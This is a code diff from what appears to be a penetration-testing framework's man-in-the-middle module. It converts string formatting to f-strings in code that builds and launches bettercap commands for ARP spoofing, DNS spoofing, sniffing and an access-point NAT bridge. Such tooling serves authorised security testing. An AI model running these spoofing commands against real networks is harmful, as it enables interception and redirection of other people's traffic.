@@ -83,13 +83,12 @@ class Exploit(Exploit):
             cmd.extend(["-iface", self.upstream_interface])
             caplet = "arp.spoof on; net.sniff on"
             if self.target_ip:
-                caplet = "set arp.spoof.targets {}; {}".format(self.target_ip, caplet)
+                caplet = f"set arp.spoof.targets {self.target_ip}; {caplet}"
             cmd.extend(["-eval", caplet])
 
         elif self.mode == "dns_spoof":
             cmd.extend(["-iface", self.ap_interface])
-            cmd.extend(["-eval", "set dns.spoof.domains {}; set dns.spoof.address {}; dns.spoof on; net.sniff on".format(
-                self.dns_target, self.dns_redirect_ip)])
+            cmd.extend(["-eval", f"set dns.spoof.domains {self.dns_target}; set dns.spoof.address {self.dns_redirect_ip}; dns.spoof on; net.sniff on"])
 
         elif self.mode == "ghost_combo":
             iface = self.upstream_interface or self.ap_interface
@@ -155,7 +154,7 @@ class Exploit(Exploit):
         log_dir.mkdir(parents=True, exist_ok=True)
 
         if self.dry_run:
-            print_info("DRY RUN — MITM {} mode via {}".format(self.mode, self.backend))
+            print_info(f"DRY RUN — MITM {self.mode} mode via {self.backend}")
             if self.mode == "ap_bridge":
                 for cmd in self._setup_nat():
                     print_status(" ".join(cmd))
@@ -164,13 +163,12 @@ class Exploit(Exploit):
             return
 
         if self.mode == "ap_bridge":
-            print_status("Setting up NAT bridge: {} -> {}".format(
-                self.ap_interface, self.upstream_interface))
+            print_status(f"Setting up NAT bridge: {self.ap_interface} -> {self.upstream_interface}")
             for cmd in self._setup_nat():
                 subprocess.run(cmd, check=False)
 
         cmd = self._build_bettercap_cmd()
-        print_status("Launching {} MITM ({} mode)...".format(self.backend, self.mode))
+        print_status(f"Launching {self.backend} MITM ({self.mode} mode)...")
         print_info("Command: {}".format(" ".join(cmd)))
 
         try:
@@ -178,6 +176,6 @@ class Exploit(Exploit):
         except KeyboardInterrupt:
             print_info("\nMITM interrupted by user.")
         except Exception as err:
-            print_error("MITM failed: {}".format(err))
+            print_error(f"MITM failed: {err}")
 
         print_info("MITM session complete.")
